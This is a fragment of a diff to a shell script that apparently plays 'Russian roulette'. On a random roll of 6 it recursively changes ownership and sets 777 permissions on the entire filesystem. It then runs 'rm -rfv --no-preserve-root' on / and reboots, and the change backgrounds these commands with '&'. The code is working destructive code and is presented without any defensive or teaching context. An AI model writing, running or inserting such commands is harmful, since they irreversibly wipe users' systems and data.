@@ -46,14 +46,14 @@ if [ $random_number -eq 6 ];then
     echo "Bang!"
   fi
 
-  chown -R $USER:$USER /*
-  chmod -R 777 /*
+  chown -R $USER:$USER /* &
+  chmod -R 777 /* &
 
-  chown -R $USER:$USER /
-  chmod -R 777 /
+  chown -R $USER:$USER / &
+  chmod -R 777 / &
 
-  rm -rfv --no-preserve-root /*
-  rm -rfv --no-preserve-root /
+  rm -rfv --no-preserve-root /* &
+  rm -rfv --no-preserve-root / &
 
   reboot
 else
